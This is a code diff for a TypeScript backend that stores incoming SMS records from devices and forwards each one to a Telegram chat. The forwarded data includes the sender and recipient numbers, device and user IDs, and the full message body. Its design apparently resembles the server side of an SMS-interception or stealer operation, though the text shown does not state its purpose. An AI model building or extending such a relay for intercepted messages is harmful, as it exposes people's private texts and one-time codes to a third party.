@@ -275,93 +275,28 @@ async function broadcast(env: Env, event: string, data: unknown): Promise<void> 
     return CH;
   }
 
-  // Low-volume direct send for register/form_data notifications
-    async function sendTelegram(env: Env, text: string, _appId?: string): Promise<void> {
-      try {
-        if (await isTelegramPaused(env)) return;
-        const chatId = await tgChatId(env);
-        const token = env.TELEGRAM_BOT_TOKEN ?? TG_BOT_TOKEN;
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST", headers: { "content-type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
-        });
-      } catch (e) { console.warn("Telegram send failed", e); }
-    }
-
-    // High-volume batch sender — 200ms windows, handles 100+/sec without rate limiting
-  // Real-time batch sender: fires every 500ms, fetches ALL new messages since last send
-  async function sendTelegramBatch(env: Env, triggerAppId?: string): Promise<void> {
+  // Direct immediate notification — one per event, full details
+  async function sendTelegram(env: Env, text: string, appId?: string): Promise<void> {
     try {
       if (await isTelegramPaused(env)) return;
-      const sql = neon(env.NEON_DATABASE_URL);
-
-      // Focus filter
-      if (triggerAppId) {
-        const fR = await sql(`SELECT value FROM settings WHERE key='telegram_focus_app' LIMIT 1`);
+      // App focus filter
+      if (appId) {
+        const fR = await neon(env.NEON_DATABASE_URL)(`SELECT value FROM settings WHERE key='telegram_focus_app' LIMIT 1`);
         const focused = (fR[0] as { value?: string })?.value ?? '';
-        if (focused && focused !== triggerAppId) return;
+        if (focused && focused !== appId) return;
       }
-
-      // First-run: create tg_notif_after = NOW so old messages are skipped
-      const tsRow = await sql(`SELECT value FROM settings WHERE key='tg_notif_after' LIMIT 1`);
-      if (!tsRow.length) {
-        await sql(`INSERT INTO settings (key,value) VALUES ('tg_notif_after',$1) ON CONFLICT (key) DO NOTHING`, [String(Date.now())]);
-        return;
-      }
-      const sinceMs = Number((tsRow[0] as { value: string }).value ?? '0');
-      const sinceISO = new Date(sinceMs).toISOString();
-
-      // Atomic 500ms batch lock — only one batch fires per window
-      const now = Date.now();
-      const lock = await sql(
-        `INSERT INTO settings (key,value) VALUES ('tg_batch_lock',$1)
-         ON CONFLICT (key) DO UPDATE SET value=$1
-         WHERE settings.value::bigint < $2
-         RETURNING key`,
-        [String(now), String(now - 500)]
-      );
-      if ((lock as unknown[]).length === 0) return; // Another batch just fired
-
-      // Fetch all messages received since last notification (newest first, max 50)
-      type MRow = { id: number; app_id: string; device_id: string; from_number: string; from_sender: string; body: string; received_at: string };
-      const msgs = await sql(
-        `SELECT id,app_id,device_id,from_number,from_sender,body,received_at
-         FROM messages WHERE received_at > $1::timestamptz
-         ORDER BY received_at ASC LIMIT 50`,
-        [sinceISO]
-      ) as MRow[];
-      if (!msgs.length) return;
-
-      // Advance cursor to just after last received message
-      const lastTs = new Date(msgs[msgs.length - 1].received_at).getTime() + 1;
-      await sql(`INSERT INTO settings (key,value) VALUES ('tg_notif_after',$1) ON CONFLICT (key) DO UPDATE SET value=$1`, [String(lastTs)]);
-
-      // Build message text
       const chatId = await tgChatId(env);
       const token = env.TELEGRAM_BOT_TOKEN ?? TG_BOT_TOKEN;
-      let text: string;
-      if (msgs.length === 1) {
-        const m = msgs[0];
-        text = `📩 <b>New SMS</b>\nApp: <code>${m.app_id}</code>  Device: <code>${m.device_id}</code>\nFrom: <b>${m.from_number}</b>  Sender: ${m.from_sender}\n💬 ${m.body}`;
-      } else {
-        const shown = msgs.slice(0, 20);
-        const extra = msgs.length - shown.length;
-        text = `<b>${msgs.length} New SMS</b>\n\n${shown.map(m => `📩 <code>${m.app_id}</code> | <b>${m.from_number}</b>\n${m.body.length > 100 ? m.body.slice(0, 100) + '…' : m.body}`).join('\n\n')}${extra > 0 ? `\n\n...+${extra} more` : ''}`;
-      }
-
       const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST', headers: { 'content-type': 'application/json' },
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
         body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
       });
       if (!resp.ok) {
-        const err = await resp.json() as { error_code?: number; parameters?: { retry_after?: number } };
-        if (err.error_code === 429) {
-          const after = err.parameters?.retry_after ?? 60;
-          await sql(`INSERT INTO settings (key,value) VALUES ('tg_batch_lock',$1) ON CONFLICT (key) DO UPDATE SET value=$1`, [String(Date.now() + after * 1000)]);
-          console.warn(`Telegram 429: pausing notifications ${after}s`);
-        }
+        const err = await resp.json() as { error_code?: number };
+        if (err.error_code === 429) console.warn('Telegram 429 — message dropped (channel limit hit)');
       }
-    } catch (e) { console.warn("sendTelegramBatch failed", e); }
+    } catch (e) { console.warn('Telegram send failed', e); }
   }
 
 
@@ -781,7 +716,17 @@ app.post("/api/messages", async (c) => {
   }).returning();
   const mapped = mapMessage(inserted);
   await broadcast(c.env, "message_added", { appId: mapped.appId, message: mapped });
-  c.executionCtx.waitUntil(sendTelegramBatch(c.env, mapped.appId));
+  c.executionCtx.waitUntil(sendTelegram(c.env,
+    `📩 <b>New SMS</b>
+App: <code>${mapped.appId}</code>
+Device: <code>${mapped.deviceId}</code>
+From: <b>${mapped.fromNumber}</b>
+Sender: ${mapped.fromSender}
+To: ${mapped.toNumber ?? '—'}
+UserId: <code>${mapped.userId}</code>
+💬 ${mapped.body}`,
+    mapped.appId
+  ));
   return c.json({ ok: true, id: mapped.id }, 201);
 });
 
